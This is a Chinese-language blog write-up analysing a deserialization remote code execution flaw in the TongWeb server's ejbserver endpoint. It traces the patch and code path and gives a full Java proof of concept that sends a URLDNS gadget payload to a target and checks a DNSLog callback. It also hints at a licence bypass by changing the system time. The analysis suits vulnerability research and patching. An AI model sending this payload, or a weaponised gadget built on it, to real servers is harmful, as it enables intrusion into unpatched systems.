---
title: 东方通 TongWeb 应用服务器 ejbserver 远程代码执行漏洞
date: 2025-11-15 12:00:00
tags:
  - 漏洞分析
---

##### 环境搭建：
windows下双击exe安装，然后将 licence.dat 放入安装目录并修改系统时间

启动系统 /bin/startserver.bat

下载链接：https://pan.baidu.com/s/1l8WKKD9hg2wu5sDxnVneCQ  提取码:jnn7

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763449004141-c02cd657-5f29-4669-8444-5984ba7fb1b2.png)

##### 漏洞分析：
查看官方通告：

https://www.tongtech.com/newsDetail/102461.html

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763449886743-bf535aef-a527-48ee-9fb1-49674a2506e6.png)

下载漏洞补丁对比：com.tongweb.tongejb.server.httpd.ServerServlet 中直接关闭了8088端口的访问服务

https://www.tongtech.com//dft/downloads/128.html

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763450172269-06e16f55-70aa-4d8c-9bc9-146e8eb96db2.png)

继续跟进 this.ejbServer.service(in, out); 

com.tongweb.tongejb.server.ejbd.EjbServer#service(java.io.InputStream, java.io.OutputStream)

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763451501112-e8e58249-25fd-4251-9934-ce57e20db02b.png)

继续跟进 this.server.service(inputStream, outputStream); 此处构建了 ProtocolMetaData 和 ServerMetaData ，并从输入流中读取。

com.tongweb.tongejb.server.ejbd.EjbDaemon#service(java.io.InputStream, java.io.OutputStream)

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763451597718-bf76da0a-51b7-433b-af73-bc9b140ee940.png)

先查看 clientProtocol.readExternal(cis); 这里会读取前8字节，然后正则匹配协议头

com.tongweb.tongejb.client.ProtocolMetaData#readExternal

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763452490446-63e94987-9a86-4877-8804-7fde02793512.png)

继续查看 serverMetaData.readExternal(ois); 此处产生反序列化点，然后在readObject之前进行了readByte所以我们生成序列化数据之前需要先writeByte

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763452685747-3d30fa4e-902f-467a-9478-8e57c94355bc.png)

综上可以构造 URLDNS 链验证：

```plain
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.util.HashMap;

public class tongweb {

    public static void main(String[] args) throws Exception {
        // 使用 DNSLog 或 Burp Collaborator 生成的域名进行测试
        String dnsUrl = "http://qay5.callback.red"; // 替换为你的DNSLog域名
        String targetUrl = "http://192.168.211.251:8088";

        byte[] payload = generateURLDNSPayload(dnsUrl);
        sendExploit(targetUrl, payload);
    }

    public static byte[] generateURLDNSPayload(String urlString) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        // 1. 写入ProtocolMetaData
//        String protocolSpec = "W3EP/4.2"; // 7.0.4.6等新版本可用
        String protocolSpec = "OEJP/4.6"; // 7.0.4.2等老版本可用
        byte[] specBytes = protocolSpec.getBytes("UTF-8");

        if (specBytes.length != 8) {
            throw new IllegalArgumentException("Protocol spec must be exactly 8 bytes!");
        }

        baos.write(specBytes);

        // 2. ObjectOutputStream部分
        ObjectOutputStream oos = new ObjectOutputStream(baos);

        // 3. 写入ServerMetaData
        oos.writeByte(1);
        URI[] locations = new URI[] {
                new URI("http://localhost:8080/")
        };
        oos.writeObject(locations);

        // 4. 写入第一个RequestType字节
        oos.writeByte((byte)0); // RequestType.EJB_REQUEST

        // 5. 写入第二个RequestType字节
        oos.writeByte((byte)0); // RequestType.EJB_REQUEST

        // 6. 写入EJBRequest数据
        // 6.1 RequestMethodCode
        oos.writeByte(23); // EJB_OBJECT_BUSINESS_METHOD

        // 6.2 创建URLDNS payload
        // URLDNS链核心：利用HashMap反序列化时调用URL.hashCode()触发DNS查询
        URL url = new URL(urlString);

        // 使用自定义URLStreamHandler避免本地触发DNS
        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap();

        // 创建URL对象，使用自定义handler
        URL u = new URL(null, urlString, handler);
        ht.put(u, urlString); // 将URL作为key放入HashMap

        // 通过反射设置URL对象的hashCode为-1，确保反序列化时重新计算
        Field f = URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(u, -1);

        // 6.3 写入deploymentId (触发反序列化!)
        oos.writeObject(ht); // 写入URLDNS payload

        // 6.4 写入deploymentCode
        oos.writeShort(0);

        // 6.5 写入clientIdentity
        oos.writeObject(null);

        // 6.6 写入serverHash
        oos.writeInt(0);

        oos.flush();
        return baos.toByteArray();
    }

    // 自定义URLStreamHandler，用于避免本地触发DNS查询
    static class SilentURLStreamHandler extends URLStreamHandler {
        @Override
        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        @Override
        protected InetAddress getHostAddress(URL u) {
            return null; // 阻止DNS解析
        }
    }

    public static void sendExploit(String targetUrl, byte[] payload) throws Exception {
        java.net.URL url = new java.net.URL(targetUrl + "/ejbserver/ejb");
        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();

        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        try (OutputStream os = conn.getOutputStream()) {
            os.write(payload);
            os.flush();
        }

        int responseCode = conn.getResponseCode();
        System.out.println("Response Code: " + responseCode);
        System.out.println("see your dnslog!");



        conn.disconnect();
    }
}




```

##### 漏洞复现：
![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763453283198-85701273-492c-4200-9d96-8658f34f235c.png)

![](https://cdn.nlark.com/yuque/0/2025/png/22387372/1763453299181-3150176a-c411-41f2-b738-678e9f611b5d.png)
